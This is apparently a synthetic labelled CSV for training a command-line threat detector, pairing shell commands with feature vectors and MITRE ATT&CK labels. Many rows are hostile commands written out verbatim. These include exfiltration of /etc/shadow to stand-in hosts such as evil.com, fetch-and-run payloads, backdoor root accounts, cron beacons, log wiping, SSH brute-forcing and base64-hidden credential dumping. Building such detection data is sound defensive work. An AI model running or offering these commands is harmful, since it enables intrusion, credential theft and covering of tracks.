arp -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
nohup for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.6, 0, 0]",['T1110_Brute_Force'],synthetic
nohup net user /domain &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 0, 0]",['T1136_Create_Account'],synthetic
time passwd -d root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1136_Create_Account'],synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
sudo masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""echo '' > /var/log/syslog ; history -c""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
reg  delete  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  /v  Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in && echo done,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
ssh admin@localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1078_Valid_Accounts'],synthetic
find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo 'Y2F0IC9ldGMvZ3JvdXAgOyBlY2hvIGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
python3 exploit.py --target localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
getent group sudo | > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'ZmluZCAvIC1uYW1lICcqLmNvbmYnIC1yZWFkYWJsZSAyPi9kZXYvbnVsbCB8IGhlYWQgLTIw' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'd2hvIDsgc2xlZXAgMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'd21pYyB1c2VyYWNjb3VudCBsaXN0IHwgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
locate wp-config.php,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
sudo New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1112_Modify_Registry'],synthetic
"php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
systemctl enable --now malicious.service,"[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
masscan -p1-65535 10.0.0.0/24 --rate=1000 && sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time groups,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
New-ItemProperty  -Path  'HKLM:\...'  -Name  Persist  -Value  'C:\payload.exe'  |  >  /dev/null  2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo ./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
Get-LocalGroupMember -Group Administrators && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo  'bHNiX3JlbGVhc2UgLWEgOyBlY2hvIGRvbmU='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
reg  delete  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  /v  Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
"python3 -c ""exec(__import__('base64').b64decode('aW1wb3J0IG9z').decode())"" && sleep 1","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
echo 'eGZyZWVyZHAgL3U6QWRtaW5pc3RyYXRvciAvcDpQYXNzd29yZDEyMyAvdjoxMC4wLjAuNQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
nmap -sn 192.168.1.0/24 | history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.2, 0.24, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""python3 -c 'print(1+1)'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
"bash -c ""echo 'bWltaWthdHouZXhlICdzZWt1cmxzYTo6bG9nb25wYXNzd29yZHMnIGV4aXQ=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
wmiexec.py domain/admin:pass@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1021_Remote_Services'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
nohup cat /etc/passwd | grep -v nologin | grep -v false &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.48, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
nohup net localgroup administrators &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
awk -F: '{print $1}' /etc/passwd | head -5,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['BENIGN'],synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
wmiexec.py domain/admin:pass@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1021_Remote_Services'],synthetic
echo 'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlcg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
wget --post-file=/etc/passwd http://attacker.com/receive | history -c,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time curl -s http://c2.attacker.com/beacon,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
top -bn1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
"bash -c ""curl -s http://c2.attacker.com/beacon""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
time echo 'bG9jYXRlIHdwLWNvbmZpZy5waHA=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
service apache2 status,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
id | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0.2, 0.2, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
echo 'Y2F0IC9ldGMvb3MtcmVsZWFzZSB8IGVjaG8gZG9uZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
"bash -c ""curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in | history -c""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
passwd -d root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1098_Account_Manipulation'],synthetic
masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'dw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
whoami /all,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
time ln -s /tmp/backdoor.sh /etc/cron.d/system-update,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1053_Scheduled_Task'],synthetic
"bash -c ""route -n""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
echo  'dXNlcmFkZCAtbSAtcyAvYmluL2Jhc2ggLUcgc3VkbyBuZXdhZG1pbg=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
"python3 -c 'import socket,subprocess,os;...'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
ssh -L 8080:internal:80 user@jump.host && echo done,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
time whoami,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
time traceroute google.com,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
time tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
sh  -c  'curl  http://evil.com/shell.sh  |  bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
time fping -a -g 192.168.1.0/24 2>/dev/null,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
echo  'Z3JvdXBzICQod2hvYW1pKQ=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo echo 'bHNiX3JlbGVhc2UgLWEgOyBlY2hvIGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
masscan -p1-65535 10.0.0.0/24 --rate=1000 ; history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.0, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
"bash -c ""systemctl enable --now malicious.service ; sleep 1""","[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
smbclient //10.0.0.5/C$ -U Administrator ; history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -X POST http://evil.com/collect -d @/etc/shadow,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"bash -c ""echo 'd2dldCAtcSAtTy0gLS1oZWFkZXI9J1gtQXV0aDogdG9rZW4xMjMnIGh0dHA6Ly9ldmlsLmNvbS9jbWQ=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup find /home -name '.env' 2>/dev/null &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
ip addr show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
systemctl enable --now malicious.service ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 1]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
systemctl enable --now malicious.service && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
certutil.exe  -urlcache  -split  -f  http://attacker.com/nc.exe  nc.exe,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
> ~/.bash_history && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]",['T1070_Indicator_Removal'],synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
time wmic useraccount list,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1087_Account_Discovery'],synthetic
for  p  in  $(cat  passwords.txt);  do  sshpass  -p  $p  ssh  root@10.0.0.1  id;  done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
nohup fping -a -g 192.168.1.0/24 2>/dev/null &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
useradd -m -s /bin/bash hacker | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bGFzdCAtbiAxMCA7IGVjaG8gZG9uZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
wmiexec.py domain/admin:pass@10.0.0.5 | chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 1]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup find / -writable -type d 2>/dev/null &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
echo 'bm1hcCAtQSAtVDQgMTkyLjE2OC4xLjAvMjQgJiYgZWNobyBkb25l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
shred -u /var/log/auth.log && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./pwnkit && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1053_Scheduled_Task'],synthetic
$env:cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
last -n 10 | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -X POST http://evil.com/collect -d @/etc/shadow | > /dev/null 2>&1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"time nmap -sV -p 22,80,443 10.0.0.0/24","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
"python3 -c 'import socket,subprocess,os;...'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
time certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe ; chmod +x /tmp/payload,"[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0.0, 0.44, 1, 1]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
"bash -c ""python3 exploit.py --target localhost | > /dev/null 2>&1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ssh -L 8080:internal:80 user@jump.host ; sleep 1,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
